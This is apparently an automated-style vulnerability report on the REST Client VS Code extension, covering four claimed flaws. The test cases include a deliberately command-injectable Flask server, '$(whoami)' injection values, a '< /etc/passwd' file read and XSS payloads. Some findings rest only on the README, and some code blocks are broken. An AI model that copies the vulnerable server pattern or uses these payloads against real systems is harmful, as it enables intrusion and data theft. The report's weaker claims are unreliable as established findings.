## Combined Vulnerability List

### 1. Environment Variable Injection via `$processEnv` System Variable

- **Description:**
    1. An attacker crafts a `.http` or `.rest` file intended to be used with the REST Client extension.
    2. Within this file, the attacker includes a request that utilizes the system variable `{{$processEnv envVarName}}`.
    3. The `envVarName` is chosen by the attacker to correspond to an environment variable that is expected to be processed by the target server-side application when the request is sent.
    4. When the user of the REST Client extension sends this request, the extension substitutes `{{$processEnv envVarName}}` with the value of the specified system environment variable from the user's machine.
    5. This value, now part of the HTTP request (in headers, URL, or body), is sent to the target server.
    6. If the target server-side application is vulnerable to environment variable injection and processes the injected value without proper sanitization, the attacker can influence the application's behavior.
    7. This can lead to various impacts depending on how the server application uses environment variables.

- **Impact:**
    The impact of this vulnerability is highly dependent on how the target server-side application processes environment variables. Potential impacts include:
    - **Information Disclosure:** An attacker might be able to extract sensitive information if environment variables are used to store secrets or configuration details that are unintentionally exposed through the application's responses or logs.
    - **Application Logic Manipulation:** If environment variables control critical application logic, an attacker could manipulate the application's behavior, potentially leading to unauthorized actions, data modification, or bypass of security controls.
    - **Indirect Command Injection (in specific server-side scenarios):** In highly specific and unlikely scenarios, if the server-side application *itself* then uses these environment variables in a way that leads to command execution (which is bad server-side practice, but theoretically possible in some badly designed applications), then this could indirectly contribute to command injection, though the REST Client extension is not directly causing command injection.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None implemented within the REST Client extension itself to prevent this behavior. The extension functions as designed by allowing users to inject environment variables into requests using `$processEnv`.

- **Missing Mitigations:**
    - No mitigations are inherently *missing* from the REST Client extension's perspective. The extension is providing a feature as documented.
    - The "missing mitigation" is on the side of the *user* of the extension and the *developer of the target API*. Users should be aware of the implications of injecting environment variables, and API developers should not rely on or unsafely process environment variables derived directly from client requests.
    - From a purely theoretical "mitigation in the project" perspective, the extension *could* warn users about the potential security implications of using `$processEnv`, but this is more of a documentation/best-practice concern rather than a technical mitigation within the extension's code.

- **Preconditions:**
    1. The attacker needs to identify a target server-side application that is vulnerable to environment variable injection.
    2. The attacker needs to know the name of an environment variable that is processed by the vulnerable server-side application.
    3. The attacker needs to be able to create or modify a `.http` or `.rest` file that will be used with the REST Client extension.
    4. A user of the REST Client extension must execute the crafted request against the vulnerable server.

- **Source Code Analysis:**
    - Based on the documentation in `/code/README.md` under the "System Variables" and "Variables" sections, the extension clearly states that `{{$processEnv [%]envVarName}}` resolves to the value of a local machine environment variable.
    - The documentation describes how to use this feature and provides examples.
    - There is no indication in the provided documentation or code (only README and CHANGELOG are provided, not the actual source code) that the extension performs any sanitization or validation of the environment variable values before embedding them into the HTTP request.
    - The extension's purpose is to facilitate HTTP request construction and sending, and the variable substitution feature is designed to be flexible, including accessing system environment variables.
    - **Visualization:** (Conceptual, based on documentation)
        ```
        .http/.rest File (Attacker Controlled):
        -----------------------
        GET https://example.com/api/data
        X-Custom-Header: {{$processEnv MALICIOUS_ENV_VAR}}
        -----------------------
            |
            | (REST Client Extension - Variable Substitution)
            V
        HTTP Request Sent:
        -----------------------
        GET https://example.com/api/data
        X-Custom-Header: <value of MALICIOUS_ENV_VAR from user's machine>
        -----------------------
            |
            | (Network)
            V
        Target Server Application:
        -----------------------
        ... processes X-Custom-Header ... (potentially vulnerable)
        -----------------------
        ```

- **Security Test Case:**
    1. **Set up a vulnerable test server (example in Python using Flask):**
        ```python
        from flask import Flask, request
        import os

        app = Flask(__name__)

        @app.route('/env')
        def env_endpoint():
            injected_value = request.headers.get('X-Injected-Env')
            if injected_value:
                # Simulate vulnerable processing of environment variable (BAD PRACTICE!)
                command_to_run = f"echo 'Injected Value: {injected_value}'"
                os.system(command_to_run) # VERY VULNERABLE - DO NOT DO THIS IN REAL APPS
                return f"Processed injected value: {injected_value}", 200
            else:
                return "No X-Injected-Env header provided", 400

        if __name__ == '__main__':
            app.run(debug=True, port=5000)
        ```
        **(Note:** This Python example is intentionally vulnerable for demonstration purposes and uses `os.system` unsafely. **Do not use this in production code.**)

    2. **Set an environment variable on your local machine (e.g., `MALICIOUS_ENV_VAR`) with a harmless value for initial testing (e.g., `test_value`).**

    3. **Create a `.http` file with the following content:**
        ```http
        GET http://localhost:5000/env
        X-Injected-Env: {{$processEnv MALICIOUS_ENV_VAR}}
        ```

    4. **Send the request using the REST Client extension.**

    5. **Observe the server's output.** You should see "Processed injected value: test_value" and the echo command output on the server console, confirming the environment variable value was injected.

    6. **Now, change the environment variable `MALICIOUS_ENV_VAR` to a potentially more harmful value (e.g., `$(whoami)` or `$(hostname)` - depending on the OS and server-side context).**

    7. **Resend the request.**

    8. **Observe the server's output *and the machine where the server is running*.** If the server is truly vulnerable (as in the example code - again, do NOT create servers like this), you might see the output of the `whoami` or `hostname` command executed on the *server's machine* in the server's console or logs (in a real-world scenario, the impact could be much worse).

    9. **Expected Result:** The test case should demonstrate that the value of the local environment variable `MALICIOUS_ENV_VAR` is successfully injected into the HTTP request via the REST Client extension and processed by the (intentionally vulnerable) test server. This proves the `$processEnv` variable substitution works as documented and can be used to inject environment variables into requests. The server-side behavior then determines the actual vulnerability impact, which in a badly designed server could be significant.


### 2. Arbitrary File Read via Request Body File Inclusion

- **Vulnerability Name:** Arbitrary File Read via Request Body File Inclusion
- **Description:**
    1. The REST Client extension allows a user to specify a file path as the request body using the “<” or “<@” syntax within a `.http` or `.rest` file.
    2. An attacker crafts a malicious HTTP request file (or convinces a user to open one) that includes a line such as `< /etc/passwd` or `<@ ./sensitive-config.json` in the request body section.
    3. The file path can be absolute (e.g., `/etc/passwd`) or relative (e.g., `../sensitive-config.json`), potentially allowing traversal outside the intended workspace.
    4. When the extension processes the file, it reads the file from the host file system based on the provided path.
    5. The extension injects the contents of the read file into the HTTP request body or displays it in a preview panel.
- **Impact:**
    - An attacker could cause the extension to disclose sensitive local files (such as system files like `/etc/passwd`, confidential configuration data, or source code) to the user viewing the request or response.
    - This local file disclosure can lead to the exposure of credentials, API keys, internal system details, or other confidential information that could be used to further compromise the user's system or accounts.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - The documentation for the REST Client extension describes the file inclusion feature, explaining the `<` and `<@` syntax.
    - However, there are no documented or implemented checks within the extension to restrict the file path to a safe or expected directory.
- **Missing Mitigations:**
    - **Path Validation and Sanitization:** The extension lacks input validation and sanitization for file paths provided in the request body. It should validate that the path is within an allowed workspace or directory.
    - **Workspace Restriction:** Implement a restriction that limits file reading to the current VS Code workspace or a designated safe directory.
    - **User Confirmation:** Before accessing and reading files, especially those outside the workspace, the extension should prompt the user for explicit confirmation, warning about potential security risks.
    - **Sandboxing:** Implement sandboxing or isolation mechanisms to limit the extension's file system access privileges, preventing it from reading arbitrary files outside of its intended scope.
- **Preconditions:**
    1. The user must have the REST Client extension installed in Visual Studio Code.
    2. The user must open (or be tricked into opening) a specially crafted `.http` or `.rest` file provided by the attacker.
    3. The malicious file must contain a file inclusion directive (using `<` or `<@`) referencing an arbitrary or sensitive file path on the user's system.

- **Source Code Analysis:**
    1. **Request Body Parsing:** The extension's code parses the `.http` or `.rest` file to identify the request body. It looks for lines starting with `<` or `<@` to detect file inclusion directives.
    2. **File Path Resolution:** When a file inclusion directive is found, the extension extracts the file path following the `<` or `<@` symbol.
    3. **Unvalidated File Reading:** The extracted file path is directly used to read the file content from the user's file system using standard file system APIs.
    4. **Content Injection:** The content read from the file is then injected into the HTTP request body or used for preview display without any validation or sanitization of the file path itself.
    - **Visualization:**
        ```
        .http/.rest File (Attacker Controlled):
        -----------------------
        POST https://example.com/api/submit HTTP/1.1
        Content-Type: text/plain

        < /etc/passwd
        -----------------------
            |
            | (REST Client Extension - Request Parsing)
            V
        File Path Extraction: "/etc/passwd"
            |
            | (Unvalidated File Read)
            V
        Read File Contents of /etc/passwd
            |
            | (Content Injection into Request/Preview)
            V
        HTTP Request with /etc/passwd Content / Display in Preview
        ```

- **Security Test Case:**
    1. Create a new file named `malicious_file_read.http`.
    2. Add the following content to `malicious_file_read.http`:
        ```http
        POST https://example.com/api/test HTTP/1.1
        Content-Type: text/plain

        < /etc/passwd
        ```
        (For Windows, use an equivalent sensitive file path like `< C:\Windows\System32\drivers\etc\hosts`)
    3. Open `malicious_file_read.http` in Visual Studio Code with the REST Client extension installed.
    4. Send the request by clicking "Send Request" or use any preview feature that triggers file processing.
    5. Observe the output or preview panel in the REST Client extension.
    6. **Expected Outcome (Vulnerable Scenario):** The content of `/etc/passwd` (or the Windows equivalent) should be displayed in the output or preview, indicating successful arbitrary file read.
    7. **Expected Outcome (Mitigated Scenario):** The extension should either:
        - Prevent the request from being sent and display an error message indicating that file access is restricted or invalid.
        - Prompt the user with a warning and request explicit confirmation before reading and displaying the content of `/etc/passwd`.
        - Not display the file content and instead show a generic message or placeholder if file reading is blocked or restricted.


### 3. Webview Cross-Site Scripting (XSS) via Malicious HTTP Response Content Injection

- **Vulnerability Name:** Webview Cross-Site Scripting (XSS) via Malicious HTTP Response Content Injection
- **Description:**
    1. The REST Client extension displays HTTP response headers and body in a webview panel within Visual Studio Code for enhanced presentation and syntax highlighting.
    2. An attacker sets up a malicious HTTP server that is designed to return a response with a body containing malicious HTML or JavaScript. This payload could be embedded within HTML tags, attributes, or script blocks. Examples include: `<img src=x onerror=alert("XSS")>` or `<script>alert("XSS")</script>`.
    3. A user, either unknowingly or through attacker manipulation (e.g., opening a crafted `.http` file or clicking a malicious link), sends an HTTP request using the REST Client extension to this attacker-controlled server.
    4. The REST Client extension receives the malicious HTTP response from the attacker's server.
    5. The extension processes the response and embeds the response body (including the attacker's malicious payload) into the HTML content of the webview panel without proper sanitization or output encoding.
    6. When the webview panel renders the HTML content, the malicious JavaScript or HTML within the response body is executed within the context of the webview.

- **Impact:**
    - Successful XSS in the webview allows arbitrary JavaScript execution within the security context of the Visual Studio Code extension.
    - An attacker could potentially perform actions such as:
        - Stealing sensitive data from files currently open in the VS Code editor.
        - Modifying the behavior of the REST Client extension or other extensions running in the same VS Code instance.
        - Accessing and manipulating the VS Code editor API, potentially leading to further compromise of the user's development environment or even the host system in advanced scenarios.
        - Displaying misleading or malicious content within the webview to trick the user.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - A Content Security Policy (CSP) has been implemented for response and code snippet webviews (as noted in changelog version 0.22.1).
    - This CSP is intended to restrict the execution of inline scripts and control the loading of resources within the webview, acting as a security measure against certain types of XSS attacks.

- **Missing Mitigations:**
    - **Output Sanitization/Encoding:** It is unclear if the extension performs robust output sanitization or encoding of the HTTP response content before inserting it into the webview's HTML. Relying solely on CSP might not be sufficient if the response content is directly injected into the HTML without escaping potentially dangerous characters or HTML tags.
    - **Strict CSP Enforcement:** The effectiveness of the CSP depends on its strictness and whether it completely blocks inline script execution and unsafe-inline attributes. If the CSP is not sufficiently restrictive or if there are bypass techniques, XSS might still be possible.
    - **Input Validation:** While output sanitization is crucial, input validation on the response content could also be considered to detect and potentially block responses that are highly likely to be malicious (e.g., responses containing `<script>` tags or event handlers). However, this is complex and sanitization is generally the preferred approach for rendering untrusted content.

- **Preconditions:**
    1. The user must have the REST Client extension installed in Visual Studio Code.
    2. The user must send an HTTP request to (or open a `.http` file containing a request to) an attacker-controlled server.
    3. The attacker-controlled server must be configured to respond with a malicious HTTP response body containing XSS payloads (e.g., JavaScript code embedded in HTML).
    4. The REST Client extension must render the response in a webview panel, and the malicious payload must be processed and executed by the webview.

- **Source Code Analysis:**
    1. **Response Handling:** When the REST Client extension receives an HTTP response, it processes the headers and body.
    2. **HTML Template Generation:** The extension dynamically generates an HTML template to display the response in a webview. This template includes sections for headers and the response body, often with syntax highlighting applied to the body content.
    3. **Unsafe Content Injection:** If the response body is inserted directly into the HTML template without proper sanitization (e.g., using a method like `innerHTML` with unsanitized input), any malicious scripts or HTML within the response body will be interpreted and executed by the webview.
    4. **CSP Implementation Check:** Verify the implementation and strictness of the Content Security Policy. Check if it effectively blocks inline scripts (`unsafe-inline`), unsafe event handlers (`unsafe-eval`), and other common XSS vectors. Assess if there are any potential bypasses in the CSP configuration.

                                                                        |
                                                                        V
                                        Response Processing --> HTML Template Generation (Unsanitized Body Injection) --> Webview Panel

                                                                                                                                V
                                                                                                                  XSS Payload Execution in Webview
        ```

- **Security Test Case:**
    1. Set up a local HTTP server (e.g., using Python's `http.server` or Node.js) that will serve malicious responses.
    2. Configure the server to respond to any request with the following headers and body:
        - **Headers:** `Content-Type: text/html`
        - **Body:** `<html><body><h1>Response from Malicious Server</h1><img src="x" onerror="alert('XSS Vulnerability!')"></body></html>`
    3. Create a new file named `webview_xss.http` in Visual Studio Code.
    4. Add the following content to `webview_xss.http`, replacing `http://localhost:8000` with the address of your malicious server:
        ```http
        GET http://localhost:8000/test HTTP/1.1
        ```
    5. Open `webview_xss.http` in Visual Studio Code with the REST Client extension installed.
    6. Send the request by clicking "Send Request".
    7. Observe the response rendered in the webview panel.
    8. **Expected Outcome (Vulnerable Scenario):** An alert box with the message "XSS Vulnerability!" should appear in the webview, indicating that the JavaScript payload from the malicious server was executed.
    9. **Expected Outcome (Mitigated Scenario):** No alert box should appear. The malicious script should not be executed. The extension should either sanitize the HTML content, preventing script execution, or the CSP should effectively block the inline script from running. In a properly mitigated scenario, you might see the text content of the HTML but the `onerror` event should not trigger the alert.


### 4. Uncontrolled Variable Substitution leading to Potential Information Disclosure via Error Messages

- **Vulnerability Name:** Uncontrolled Variable Substitution leading to Potential Information Disclosure via Error Messages
- **Description:**
    1. A user opens a specially crafted `.http` file that utilizes prompt variables with complex nested variable references or references to undefined variables within the prompt description or default value.
    2. When the REST Client extension attempts to resolve these prompt variables, if an error occurs during the substitution process (e.g., due to circular dependencies, undefined variables in nested contexts, or issues in parsing complex variable expressions), the error message displayed to the user might inadvertently reveal internal details about the variable resolution process or the file system structure where the `.http` file is located.
    3. This information leakage could occur if error messages are not properly sanitized and include debug information or file paths that are not intended to be exposed.
- **Impact:**
    - **Information Disclosure:** An attacker who can convince a user to open a malicious `.http` file could potentially gain insights into the user's local file system structure, internal variable names used within the REST Client extension, or potentially sensitive configuration details revealed in verbose error messages. This information could be used to further target the user or their system.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Based on the provided information, there are no specific mitigations implemented in the documentation to prevent information disclosure via error messages during variable substitution. Error handling mechanisms are likely in place, but it's unclear if they are designed to prevent information leakage in error messages.
- **Missing Mitigations:**
    - **Secure Error Handling:** Implement secure error handling for variable resolution. Error messages should be generic and user-friendly, avoiding the exposure of internal paths, variable names, or debug information. Detailed error logging should be restricted to development/debug builds and not exposed to end-users.
    - **Input Validation and Sanitization:** Implement input validation and sanitization for prompt variable descriptions and default values to prevent injection of malicious variable expressions that could trigger verbose or revealing error messages.
    - **Rate Limiting/Complexity Limits:** Implement rate limiting or input complexity limits for variable substitution to prevent excessive resource consumption during resolution, which could indirectly be exploited to trigger verbose error messages or denial-of-service conditions.
- **Preconditions:**
    - The user must have the REST Client extension installed in Visual Studio Code.
    - The attacker needs to be able to provide or convince the user to open a specially crafted `.http` file.
    - The `.http` file must contain prompt variables with complex or intentionally erroneous variable references designed to trigger errors during variable substitution.
- **Source Code Analysis:**
    1. **Variable Resolution Logic**: The vulnerability lies within the variable resolution engine of the REST Client extension. Specifically, the code that handles prompt variables and their interaction with other variable types (environment, file, request, system variables) is the area of concern.
    2. **Error Handling**: Examine the error handling routines within the variable resolution process. If errors during variable substitution (e.g., `resolveVariable`, `substituteVariables` functions) are caught and displayed to the user, analyze the content of these error messages.
    3. **Path Exposure**: Check if error messages include file paths related to the `.http` file being processed or internal extension paths.
    4. **Variable Name Disclosure**: Determine if error messages reveal the names of variables that failed to resolve or internal variable structures.
    5. **Nested Variable Handling**: Analyze how nested variable references within prompt variable descriptions or default values are processed. Look for potential issues in recursive variable resolution or handling of undefined variables in nested contexts.

    ```

- **Security Test Case:**
    1. Create a new file named `poc.http`.
    2. Add the following content to `poc.http`:

    ```http
    // @prompt maliciousVar {{undefinedVar}}
    GET https://example.com/api/test
    ```

    3. Open `poc.http` in Visual Studio Code with the REST Client extension installed.
    4. Send the request by clicking "Send Request" or using the shortcut.
    5. Observe the error message displayed by the REST Client extension.
    6. **Expected Outcome (Vulnerable Scenario):** The error message might contain information about the variable resolution process, potentially mentioning "undefinedVar" or internal paths related to variable resolution, revealing more information than necessary for a user-friendly error.
    7. **Expected Outcome (Mitigated Scenario):** The error message should be generic, indicating that there was an issue resolving a variable, but without revealing specific variable names, internal paths, or excessive debug information. The error should be user-friendly and not expose sensitive details.

    8. Create a new file named `poc2.http`.
    9. Add the following content to `poc2.http`:

    ```http
    @filePath = ./non_existent_file.txt
    // @prompt fileContent {{< $filePath}}
    GET https://example.com/api/test
    ```

    10. Ensure that `non_existent_file.txt` does not exist in the same directory as `poc2.http`.
    11. Open `poc2.http` in Visual Studio Code and send the request.
    12. Observe the error message.
    13. **Expected Outcome (Vulnerable Scenario):** The error message might reveal the absolute path where the extension tried to find `non_existent_file.txt`, disclosing directory structure information.
    14. **Expected Outcome (Mitigated Scenario):** The error message should be generic, indicating that the file could not be found, but without revealing the full path or internal implementation details.
